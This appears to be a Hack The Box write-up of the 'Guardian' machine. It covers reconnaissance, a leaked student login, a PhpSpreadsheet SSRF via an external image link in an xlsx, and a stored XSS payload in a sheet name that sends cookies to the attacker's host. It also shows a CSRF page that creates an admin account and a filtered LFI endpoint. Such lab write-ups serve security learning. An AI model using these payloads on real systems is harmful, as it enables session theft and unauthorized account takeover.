# Guardian HTB Writeup

### https://app.hackthebox.com/machines/Guardian

```
Hexada@hexada ~/Downloads$ nmap -sC -sV -Pn -T5 --max-rate 10000 10.10.11.84 -oN guardian.htb                                                              130 ↵  
Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-30 22:13 +0300
Warning: 10.10.11.84 giving up on port because retransmission cap hit (2).
Nmap scan report for guardian.htb (10.10.11.84)
Host is up (0.066s latency).
Not shown: 543 closed tcp ports (conn-refused), 455 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9c:69:53:e1:38:3b:de:cd:42:0a:c8:6b:f8:95:b3:62 (ECDSA)
|_  256 3c:aa:b9:be:17:2d:5e:99:cc:ff:e1:91:90:38:b7:39 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Guardian University - Empowering Future Leaders
Service Info: Host: _default_; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.37 seconds
```


<img width="1635" height="649" alt="image" src="https://github.com/user-attachments/assets/d59ad7ca-e38c-46a5-b179-29199967da1b" />

```
Hexada@hexada ~/pentest-env/vrm/Guardian.htb/xlsx-payload/xl$ ffuf -u http://guardian.htb/ -H "Host: FUZZ.guardian.htb" -w /home/Hexada/pentest-env/pentesting-wordlists/2m-subdomains.txt -mc 403,302,200 -t 150 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://guardian.htb/
 :: Wordlist         : FUZZ: /home/Hexada/pentest-env/pentesting-wordlists/2m-subdomains.txt
 :: Header           : Host: FUZZ.guardian.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 150
 :: Matcher          : Response status: 403,302,200
________________________________________________

portal                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 115ms]
gitea                   [Status: 200, Size: 13498, Words: 1049, Lines: 245, Duration: 72ms]
```

<img width="1716" height="980" alt="image" src="https://github.com/user-attachments/assets/c0b1f588-bd81-46b2-bbe6-7339186b932d" />

<img width="1398" height="980" alt="image" src="https://github.com/user-attachments/assets/fa0a0513-d643-49b8-9193-609e74c2d225" />

GU0142023:GU1234

<img width="1651" height="394" alt="image" src="https://github.com/user-attachments/assets/54aa450b-4b34-4e43-ad97-fa84b8e15e71" />

<img width="1862" height="925" alt="image" src="https://github.com/user-attachments/assets/7aad6c49-5692-43d7-bbf3-6f736ccb2c0b" />

```html
<option value="1">admin</option>
<option value="2">jamil.enockson</option>
<option value="3">mark.pargetter</option>
<option value="4">valentijn.temby</option>
<option value="5">leyla.rippin</option>
<option value="6">perkin.fillon</option>
<option value="7">cyrus.booth</option>
<option value="8">sammy.treat</option>
<option value="9">crin.hambidge</option>
<option value="10">myra.galsworthy</option>
<option value="12">vivie.smallthwaite</option>
<option value="15">GU0702025</option>
<option value="16">GU0762023</option>
<option value="17">GU9492024</option>
<option value="18">GU9612024</option>
<option value="19">GU7382024</option>
<option value="20">GU6632023</option>
<option value="21">GU1922024</option>
<option value="22">GU8032023</option>
<option value="23">GU5852023</option>
<option value="24">GU0712023</option>
<option value="25">GU1592025</option>
<option value="26">GU1112023</option>
<option value="27">GU6432025</option>
<option value="28">GU3042024</option>
<option value="29">GU1482025</option>
<option value="30">GU3102024</option>
<option value="31">GU7232023</option>
<option value="32">GU8912024</option>
<option value="33">GU4752025</option>
<option value="34">GU9602024</option>
<option value="35">GU4382025</option>
<option value="36">GU7352023</option>
<option value="37">GU3042025</option>
<option value="38">GU3872024</option>
<option value="39">GU7462025</option>
<option value="40">GU3902023</option>
<option value="41">GU1832025</option>
<option value="42">GU3052024</option>
<option value="43">GU3612023</option>
<option value="44">GU7022023</option>
<option value="45">GU1712025</option>
<option value="46">GU9362023</option>
<option value="47">GU5092024</option>
<option value="48">GU5252023</option>
<option value="49">GU8802025</option>
<option value="50">GU2222023</option>
<option value="51">GU9802023</option>
<option value="52">GU3122025</option>
<option value="53">GU2062025</option>
<option value="54">GU3992025</option>
<option value="55">GU1662024</option>
<option value="56">GU9972025</option>
<option value="57">GU6822025</option>
<option value="58">GU7912023</option>
<option value="59">GU3622024</option>
<option value="60">GU2002023</option>
<option value="61">GU3052023</option>
<option value="62">GU1462023</option>
```

<img width="1644" height="559" alt="image" src="https://github.com/user-attachments/assets/e94620df-0a16-4035-878c-9f10fab4a7fd" />

<img width="594" height="391" alt="image" src="https://github.com/user-attachments/assets/bed113e5-464d-4120-a145-3591b578361f" />

<img width="1843" height="916" alt="image" src="https://github.com/user-attachments/assets/3ad67c7d-0389-40b9-aae2-0f45e77d34fa" />

<img width="581" height="190" alt="image" src="https://github.com/user-attachments/assets/0a73b1a8-67aa-46ac-9c6e-d4bd539f86a5" />

## SSRF

https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-rx7m-68vc-ppxh

create an `xslx` file with some image

```
Hexada@hexada ~/Downloads$ unzip test.xlsx' -d xlsx-payload
```

```
Hexada@hexada ~/Downloads/xlsx-payload/xl/drawings$ cat drawing1.xml
```

```xml
<xdr:wsDr
    xmlns:xdr="http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing"
    xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
    xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
    xmlns:c="http://schemas.openxmlformats.org/drawingml/2006/chart"
    xmlns:cx="http://schemas.microsoft.com/office/drawing/2014/chartex"
    xmlns:cx1="http://schemas.microsoft.com/office/drawing/2015/9/8/chartex"
    xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
    xmlns:dgm="http://schemas.openxmlformats.org/drawingml/2006/diagram"
    xmlns:x3Unk="http://schemas.microsoft.com/office/drawing/2010/slicer"
    xmlns:sle15="http://schemas.microsoft.com/office/drawing/2012/slicer">

    <xdr:oneCellAnchor>
        <xdr:from>
            <xdr:col>0</xdr:col>
            <xdr:colOff>0</xdr:colOff>
            <xdr:row>0</xdr:row>
            <xdr:rowOff>0</xdr:rowOff>
        </xdr:from>
        <xdr:ext cx="6886575" cy="4314825"/>
        <xdr:pic>
            <xdr:nvPicPr>
                <xdr:cNvPr id="0" name="image1.png" title="Зображення"/>
                <xdr:cNvPicPr preferRelativeResize="0"/>
            </xdr:nvPicPr>
            <xdr:blipFill>
                <a:blip cstate="print" r:link="rId1"/>
                <a:stretch>
                    <a:fillRect/>
                </a:stretch>
            </xdr:blipFill>
            <xdr:spPr>
                <a:prstGeom prst="rect">
                    <a:avLst/>
                </a:prstGeom>
                <a:noFill/>
            </xdr:spPr>
        </xdr:pic>
        <xdr:clientData fLocksWithSheet="0"/>
    </xdr:oneCellAnchor>

</xdr:wsDr>
```

```xml
Hexada@hexada ~/Downloads/xlsx-payload/xl/drawings/_rels$ cat drawing1.xml.rels                                                                                   
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    TargetMode="External"
    Target="http://10.10.16.33:1717/pixel.png"/>
</Relationships>
```

```
Hexada@hexada ~/Downloads/xlsx-payload$ zip -r ../exploit.xlsx *
```

```
(lab-env) Hexada@hexada ~/Downloads$ python3 -m http.server 1717 --bind 10.10.16.33                                                                               
Serving HTTP on 10.10.16.33 port 1717 (http://10.10.16.33:1717/) ...
```

<img width="997" height="425" alt="image" src="https://github.com/user-attachments/assets/b633d22d-89c5-4af8-85c8-ddd745d4ea4d" />

```
(lab-env) Hexada@hexada ~/Downloads$ python3 -m http.server 1717 --bind 10.10.16.33                                                                               
Serving HTTP on 10.10.16.33 port 1717 (http://10.10.16.33:1717/) ...
10.10.11.84 - - [31/Aug/2025 17:41:12] code 404, message File not found
10.10.11.84 - - [31/Aug/2025 17:41:12] "GET /pixel.png HTTP/1.1" 404 -
```


## XSS


```php
<?php
    require __DIR__ . '/vendor/autoload.php';
    use PhpOffice\PhpSpreadsheet\IOFactory;
    use PhpOffice\PhpSpreadsheet\Writer\Html;

    $inputFileName = 'payload.xlsx';
    $spreadsheet = IOFactory::load($inputFileName);
    $writer = new Html($spreadsheet);
    $writer->writeAllSheets();
    echo $writer->generateHTMLAll();
?>
```

https://github.com/advisories/GHSA-79xx-vf93-p7cx

```py
from openpyxl import Workbook

wb = Workbook()
ws1 = wb.active
ws1.title = "Sheet1"
ws2 = wb.create_sheet("Sheet2")
wb.save("xss.xlsx")
```

```
(lab-env) Hexada@hexada ~/pentest-env/vrm/Guardian.htb$ unzip xss.xlsx -d XSS-payload                                                                             
Archive:  xss.xlsx
  inflating: XSS-payload/docProps/app.xml  
  inflating: XSS-payload/docProps/core.xml  
  inflating: XSS-payload/xl/theme/theme1.xml  
  inflating: XSS-payload/xl/worksheets/sheet1.xml  
  inflating: XSS-payload/xl/worksheets/sheet2.xml  
  inflating: XSS-payload/xl/styles.xml  
  inflating: XSS-payload/_rels/.rels  
  inflating: XSS-payload/xl/workbook.xml  
  inflating: XSS-payload/xl/_rels/workbook.xml.rels  
  inflating: XSS-payload/[Content_Types].xml 
```

```
(lab-env) Hexada@hexada ~/pentest-env/vrm/Guardian.htb/XSS-payload/xl$ vim workbook.xml    
```

it must look like it:

```xml                                                                      
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
          xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
    <workbookPr/>
    <sheets>
        <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
        <sheet name="&lt;script&gt;document.location='http://10.10.16.33:1717/?c='+document.cookie;&lt;/script&gt;" sheetId="2" r:id="rId2"/>
    </sheets>
</workbook>
```

```
(lab-env) Hexada@hexada ~/pentest-env/vrm/Guardian.htb/XSS-payload$ zip -r ../xss_payload.xlsx *                                                                  
  adding: [Content_Types].xml (deflated 74%)
  adding: docProps/ (stored 0%)
  adding: docProps/core.xml (deflated 49%)
  adding: docProps/app.xml (deflated 27%)
  adding: _rels/ (stored 0%)
  adding: _rels/.rels (deflated 64%)
  adding: xl/ (stored 0%)
  adding: xl/workbook.xml (deflated 43%)
  adding: xl/worksheets/ (stored 0%)
  adding: xl/worksheets/sheet2.xml (deflated 41%)
  adding: xl/worksheets/sheet1.xml (deflated 41%)
  adding: xl/_rels/ (stored 0%)
  adding: xl/_rels/workbook.xml.rels (deflated 72%)
  adding: xl/theme/ (stored 0%)
  adding: xl/theme/theme1.xml (deflated 85%)
  adding: xl/styles.xml (deflated 77%)
```

```
(lab-env) Hexada@hexada ~/pentest-env/vrm/Guardian.htb$ python3 -m http.server 1717 --bind 10.10.16.33                                                     130 ↵  
Serving HTTP on 10.10.16.33 port 1717 (http://10.10.16.33:1717/) ...
```

<img width="1186" height="684" alt="image" src="https://github.com/user-attachments/assets/6cac55e0-1fba-46e7-aa8d-f1b981d5fe30" />

<img width="1700" height="178" alt="image" src="https://github.com/user-attachments/assets/dd19c668-a906-48e7-a348-ab108ea1b321" />

<img width="1684" height="145" alt="image" src="https://github.com/user-attachments/assets/62294704-2e1f-4ed8-9c0e-0f9cecc8b7f1" />

<img width="1866" height="931" alt="image" src="https://github.com/user-attachments/assets/a64df8eb-ea38-4bda-8d9c-ffc2fa70458c" />

<img width="1871" height="686" alt="image" src="https://github.com/user-attachments/assets/e09c5528-360f-42c8-bb70-6e8d4ca5fd23" />

```py
from flask import Flask, Response

app = Flask(__name__)

@app.route("/")
def index():
    html = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>test</title>
    </head>
    <body>
        <form id="csrfForm" action="http://portal.guardian.htb/admin/createuser.php" method="POST">
            <input type="hidden" name="username" value="hexada">
            <input type="hidden" name="password" value="password">
            <input type="hidden" name="full_name" value="New Admin">
            <input type="hidden" name="email" value="newadmin@example.com">
            <input type="hidden" name="dob" value="2000-01-01">
            <input type="hidden" name="address" value="Admin Address">
            <input type="hidden" name="user_role" value="admin">
            <input type="hidden" name="csrf_token" value="e70653c050169609eeaca5bb023d6785">
        </form>
        <script>
            document.getElementById('csrfForm').submit();
        </script>
    </body>
    </html>
    """

    return Response(html, content_type="text/html")


app.run(host="10.10.16.33", port=1818)
```

```
(lab-env) Hexada@hexada ~/pentest-env/vrm/Guardian.htb$ python3 server.py                                                                                         
 * Serving Flask app 'server'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://10.10.16.33:1818
Press CTRL+C to quit
```

<img width="1474" height="858" alt="image" src="https://github.com/user-attachments/assets/754e0e8b-6312-4e48-acb1-ed865313c420" />

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/6ace0581-c4e5-44d7-b28c-c66fad03a6b4" />

<img width="1852" height="666" alt="image" src="https://github.com/user-attachments/assets/48251890-e962-4109-860e-548f68517387" />

`admin/reports.php`

```php
<?php
require '../includes/auth.php';
require '../config/db.php';

if (!isAuthenticated() || $_SESSION['user_role'] !== 'admin') {
    header('Location: /login.php');
    exit();
}

$report = $_GET['report'] ?? 'reports/academic.php';

if (strpos($report, '..') !== false) {
    die("<h2>Malicious request blocked 🚫 </h2>");
}   

if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) {
    die("<h2>Access denied. Invalid file 🚫</h2>");
}
```

<img width="1869" height="660" alt="image" src="https://github.com/user-attachments/assets/f7ea5fc0-3813-4da8-83f8-151bae554bfb" />

https://github.com/synacktiv/php_filter_chain_generator
